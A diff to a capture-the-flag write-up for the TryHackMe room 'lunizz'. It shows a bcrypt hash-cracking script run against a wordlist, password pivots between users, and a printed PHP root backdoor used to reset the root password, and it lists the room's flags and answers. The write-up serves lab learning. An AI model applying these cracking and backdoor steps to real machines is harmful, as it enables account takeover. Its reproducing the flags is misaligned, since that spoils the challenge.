@@ -341,3 +341,346 @@ while True:
         c, addr = s.accept()
         with open("/var/backups/.script/fakessh.log", "a") as f:
                 f.write("Bamboozled Client :{}\n".format(addr))
+        c.sendall(b"OpenSSH 5.1\n")
+        c.sendall(b"Unable to load config info from /usr/local/ssl/openssl.cnf")
+        c.close()
+
+www-data@lunizz:/var/www/html/whatever$ ls -lah /
+ls -lah /
+total 1.8G
+drwxr-xr-x  25 root root 4.0K Mar 25  2021 .
+drwxr-xr-x  25 root root 4.0K Mar 25  2021 ..
+drwxr-xr-x   2 root root 4.0K Feb 10  2021 bin
+drwxr-xr-x   4 root root 4.0K Apr  7  2021 boot
+drwxr-xr-x   2 root root 4.0K Feb  9  2021 cdrom
+drwxr-xr-x  18 root root 3.7K Apr 17 14:25 dev
+drwxr-xr-x  96 root root 4.0K Apr  7  2021 etc
+drwxr-xr-x   4 root root 4.0K Feb 28  2021 home
+lrwxrwxrwx   1 root root   34 Mar 25  2021 initrd.img -> boot/initrd.img-4.15.0-139-generic
+lrwxrwxrwx   1 root root   34 Mar 25  2021 initrd.img.old -> boot/initrd.img-4.15.0-136-generic
+drwxr-xr-x  22 root root 4.0K Feb 11  2021 lib
+drwxr-xr-x   2 root root 4.0K Feb 10  2021 lib64
+drwx------   2 root root  16K Feb  9  2021 lost+found
+drwxr-xr-x   2 root root 4.0K Aug  6  2020 media
+drwxr-xr-x   2 root root 4.0K Aug  6  2020 mnt
+drwxr-xr-x   2 root root 4.0K Aug  6  2020 opt
+dr-xr-xr-x 116 root root    0 Apr 17 14:24 proc
+drwxr-xr-x   3 adam adam 4.0K Feb 28  2021 proct
+drwx------   6 root root 4.0K Feb 28  2021 root
+drwxr-xr-x  26 root root  840 Apr 17 14:30 run
+drwxr-xr-x   2 root root  12K Feb 10  2021 sbin
+drwxr-xr-x   2 root root 4.0K Feb  9  2021 snap
+drwxr-xr-x   2 root root 4.0K Aug  6  2020 srv
+-rw-------   1 root root 1.8G Feb  9  2021 swap.img
+dr-xr-xr-x  13 root root    0 Apr 17 14:24 sys
+drwxrwxrwt   2 root root 4.0K Apr 17 15:06 tmp
+drwxr-xr-x  10 root root 4.0K Aug  6  2020 usr
+drwxr-xr-x  14 root root 4.0K Feb 28  2021 var
+lrwxrwxrwx   1 root root   31 Mar 25  2021 vmlinuz -> boot/vmlinuz-4.15.0-139-generic
+lrwxrwxrwx   1 root root   31 Mar 25  2021 vmlinuz.old -> boot/vmlinuz-4.15.0-136-generic
+www-data@lunizz:/var/www/html/whatever$ cd /
+cd /
+www-data@lunizz:/$ cd proct
+cd proct
+www-data@lunizz:/proct$ ls
+ls
+pass
+www-data@lunizz:/proct$ cd pass
+cd pass
+www-data@lunizz:/proct/pass$ ls
+ls
+bcrypt_encryption.py
+
+or
+
+www-data@lunizz:/proct/pass$ ls -lahR /proct
+ls -lahR /proct
+/proct:
+total 12K
+drwxr-xr-x  3 adam adam 4.0K Feb 28  2021 .
+drwxr-xr-x 25 root root 4.0K Mar 25  2021 ..
+drwxr-xr-x  2 adam adam 4.0K Feb 28  2021 pass
+
+/proct/pass:
+total 12K
+drwxr-xr-x 2 adam adam 4.0K Feb 28  2021 .
+drwxr-xr-x 3 adam adam 4.0K Feb 28  2021 ..
+-rw-r--r-- 1 adam adam  273 Feb 28  2021 bcrypt_encryption.py
+
+www-data@lunizz:/proct/pass$ cat bcrypt_encryption.py
+cat bcrypt_encryption.py
+import bcrypt
+import base64
+
+passw = "wewillROCKYOU".encode('ascii')
+b64str = base64.b64encode(passw)
+hashAndSalt = bcrypt.hashpw(b64str, bcrypt.gensalt())
+print(hashAndSalt)
+
+#hashAndSalt = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
+#bcrypt.checkpw()
+
+www-data@lunizz:/proct/pass$ cat /etc/passwd | grep /bin/sh
+cat /etc/passwd | grep /bin/sh
+adam:x:1000:1000::/home/adam:/bin/sh
+mason:x:1001:1001::/home/mason:/bin/sh
+
+https://en.wikipedia.org/wiki/Bcrypt
+
+$2<a/b/x/y>$[cost]$[22 character salt][31 character hash]
+
+For example, with input password `abc123xyz`, cost `12`, and a random salt, the output of bcrypt is the string
+
+$2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW
+\__/\/ \____________________/\_____________________________/
+Alg Cost      Salt                        Hash
+
+Where:
+
+-   `$2a$`: The hash algorithm identifier (bcrypt)
+-   `12`: Input cost (212 i.e. 4096 rounds)
+-   `R9h/cIPz0gi.URNNX3kh2O`: A base-64 encoding of the input salt
+-   `PST9/PgBkqquzi.Ss7KIUgO2t0jWMUW`: A base-64 encoding of the first 23 bytes of the computed 24 byte hash
+
+The base-64 encoding in bcrypt uses the table `./ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789`,[[10]](https://en.wikipedia.org/wiki/Bcrypt#cite_note-bcrypt.c_lines_57-58-10) which is different than [RFC](https://en.wikipedia.org/wiki/RFC_(identifier) "RFC (identifier)") [4648](https://datatracker.ietf.org/doc/html/rfc4648) [Base64](https://en.wikipedia.org/wiki/Base64 "Base64") encoding.
+
+so our bcrypt will be
+
+$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e
+\__/\/ \____________________/\_____________________________/
+Alg Cost      Salt                        Hash
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat crack_bcrypt.py
+#!/usr/bin/env python3
+
+import bcrypt
+import base64
+
+salt = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.'
+bcrypt_hash = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
+
+with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
+	for word in f.readlines():
+		passw = word.strip().encode('ascii', 'ignore')
+		b64str = base64.b64encode(passw)
+		hashAndSalt = bcrypt.hashpw(b64str, salt)
+		print('\r', end='') 
+		print(f'[*] Cracking hash: {hashAndSalt}', end='')
+
+		if bcrypt_hash == hashAndSalt:
+			print('\n[+] Cracked!')
+			print(f'[+] Before hashed: {passw}')
+			print(f'[+] After hashed: {hashAndSalt}')
+			exit()
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 crack_bcrypt.py
+[*] Cracking hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
+[+] Cracked!
+[+] Before hashed: b'bowwow'
+[+] After hashed: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
+
+www-data@lunizz:/var/backups/.script$ su adam
+su adam
+Password: bowwow
+```
+```text
+$ bash
+bash
+
+adam@lunizz:~$ find / -user adam 2>/dev/null | grep -v "/proct/\|/proc/\|/run/\|/sys/\|/var/"
+<ll | grep -v "/proct/\|/proc/\|/run/\|/sys/\|/var/"
+/proct
+/home/adam
+/home/adam/.gnupg
+/home/adam/.gnupg/private-keys-v1.d
+/home/adam/Desktop
+/home/adam/Desktop/.archive
+/home/adam/Desktop/.archive/to_my_best_friend_adam.txt
+/home/adam/Downloads
+/home/adam/.bashrc
+/home/adam/.bash_logout
+/home/adam/.profile
+
+adam@lunizz:~$ cd /home/adam/Desktop/.archive/
+cd /home/adam/Desktop/.archive/
+adam@lunizz:~/Desktop/.archive$ ls
+ls
+to_my_best_friend_adam.txt
+adam@lunizz:~/Desktop/.archive$ cat to_my_best_friend_adam.txt
+cat to_my_best_friend_adam.txt
+do you remember our place 
+i love there it's soo calming
+i will make that lights my password
+
+--
+
+https://www.google.com/maps/@68.5090469,27.481808,3a,75y,313.8h,103.6t/data=!3m6!1e1!3m4!1skJPO1zlKRtMAAAQZLDcQIQ!3e2!7i10000!8i5000
+
+adam@lunizz:~/Desktop/.archive$ su mason
+su mason
+Password: northernlights
+```
+```text
+$ bash
+bash
+mason@lunizz:/home/adam/Desktop/.archive$ cd /home/mason
+cd /home/mason
+mason@lunizz:~$ ls
+ls
+user.txt
+mason@lunizz:~$ cat user.txt
+cat user.txt
+thm{23cd53cbb37a37a74d4425b703d91883}
+
+mason@lunizz:~$ netstat -tulpn
+netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      1152/python3        
+tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      1146/python3        
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                  
+Backdoor
+
+mason@lunizz:~$ curl http://127.0.0.1:8080
+curl http://127.0.0.1:8080
+**********************************************************
+*                Mason's Root Backdoor                   *
+*                                                        *
+*   Please Send Request (with "password" and "cmdtype")  *
+*                                                        *
+**********************************************************
+-------------CMD TYPES-------------
+lsla
+reboot
+passwd
+
+mason@lunizz:~$ curl http://127.0.0.1:8080 -X POST
+curl http://127.0.0.1:8080 -X POST
+Wrong Password [your place ;)]!! 
+**********************************************************
+*                Mason's Root Backdoor                   *
+*                                                        *
+*   Please Send Request (with "password" and "cmdtype")  *
+*                                                        *
+**********************************************************
+-------------CMD TYPES-------------
+lsla
+reboot
+passwd
+
+mason@lunizz:~$ ps aux | grep 127.0.0.1
+ps aux | grep 127.0.0.1
+root       878  0.0  0.0   4636    64 ?        Ss   14:26   0:00 /bin/sh -c php -S 127.0.0.1:8080 -t /root/
+root       879  0.0  1.8 273660  9248 ?        S    14:26   0:00 php -S 127.0.0.1:8080 -t /root/
+mason     2406  0.0  0.2  13144  1108 pts/1    S+   16:35   0:00 grep --color=auto 127.0.0.1
+mason@lunizz:~$ curl http://127.0.0.1:8080 -X POST -d 'password=northernlights&cmdtype=lsla'
+<0 -X POST -d 'password=northernlights&cmdtype=lsla'
+total 44
+drwx------  6 root root 4096 Feb 28  2021 .
+drwxr-xr-x 25 root root 4096 Mar 25  2021 ..
+lrwxrwxrwx  1 root root    9 Feb 10  2021 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3771 Feb 10  2021 .bashrc
+drwx------  3 root root 4096 Feb 12  2021 .cache
+drwx------  3 root root 4096 Feb 12  2021 .gnupg
+-rw-r--r--  1 root root 1044 Feb 28  2021 index.php
+drwxr-xr-x  3 root root 4096 Feb  9  2021 .local
+lrwxrwxrwx  1 root root    9 Feb 11  2021 .mysql_history -> /dev/null
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r-----  1 root root   38 Feb 28  2021 r00t.txt
+-rw-r--r--  1 root root   66 Feb 28  2021 .selected_editor
+drwx------  2 root root 4096 Feb  9  2021 .ssh
+**********************************************************
+*                Mason's Root Backdoor                   *
+*                                                        *
+*   Please Send Request (with "password" and "cmdtype")  *
+*                                                        *
+**********************************************************
+-------------CMD TYPES-------------
+lsla
+reboot
+passwd
+
+mason@lunizz:~$ curl http://127.0.0.1:8080 -X POST -d 'password=northernlights&cmdtype=passwd'
+<-X POST -d 'password=northernlights&cmdtype=passwd'
+<br>Password Changed To :northernlights<br>**********************************************************
+*                Mason's Root Backdoor                   *
+*                                                        *
+*   Please Send Request (with "password" and "cmdtype")  *
+*                                                        *
+**********************************************************
+-------------CMD TYPES-------------
+lsla
+reboot
+passwd
+
+mason@lunizz:~$ su -
+su -
+Password: northernlights
+
+root@lunizz:~# cd /root
+cd /root
+root@lunizz:~# ls
+ls
+index.php  r00t.txt
+root@lunizz:~# cat index.php
+cat index.php
+<?php
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+        if (isset($_POST['password']) and $_POST['password'] == "northernlights") {
+                if (isset($_POST['cmdtype'])) {
+                        if ($_POST['cmdtype'] == "passwd") { system("echo -n 'northernlights\nnorthernlights' | passwd"); echo "<br>Password Changed To :northernlights<br>"; }
+                        if ($_POST['cmdtype'] == "lsla") { system("ls -al /root"); }
+                        if ($_POST['cmdtype'] == "reboot") { system("reboot"); }
+                }
+        } else {
+                echo "Wrong Password [your place ;)]!! \n";
+        }
+}
+?>
+**********************************************************
+*                Mason's Root Backdoor                   *
+*                                                        *
+*   Please Send Request (with "password" and "cmdtype")  *
+*                                                        *
+**********************************************************
+-------------CMD TYPES-------------
+lsla
+reboot
+passwd
+
+root@lunizz:~# cat r00t.txt
+cat r00t.txt
+thm{ad23b9c63602960371b50c7a697265db}
+
+Was really fun :)
+```
+![[Pasted image 20230417095525.png]]
+![[Pasted image 20230417100518.png]]
+![[Pasted image 20230417112614.png]]
+What is the default password for mysql
+admin forgot to delete a .txt file that contains credentials. can you find it
+*CTF_script_cave_changeme*
+I can't run commands, there must be a mysql column that controls command executer
+*run*
+a folder shouldn't be...
+/
+*proct*
+hi adam, do you remember our place?
+it's gorgeous looks like mason loves that place. He loves it so much that he changed his password
+*Northern Lights*
+user.txt
+root.txt
+mason made a backdoor to root. so silly,
+**
+
+## Flags / Answers
+- ***thm{23cd53cbb37a37a74d4425b703d91883}***
+
+## Notes / Lessons Learned
+[[Bookstore]]
+
